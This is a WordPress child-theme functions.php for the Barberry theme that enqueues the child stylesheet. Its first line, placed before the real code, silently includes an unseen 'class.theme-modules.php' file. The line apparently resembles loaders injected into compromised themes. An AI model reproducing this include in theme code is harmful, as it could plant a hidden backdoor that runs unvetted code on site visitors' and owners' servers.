<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php //Start building your awesome child theme functions

function barberry_enqueue_styles() {
	wp_enqueue_style( 'barberry-child-styles', get_stylesheet_directory_uri() . '/style.css' );
}

add_action( 'wp_enqueue_scripts', 'barberry_enqueue_styles', 1000 );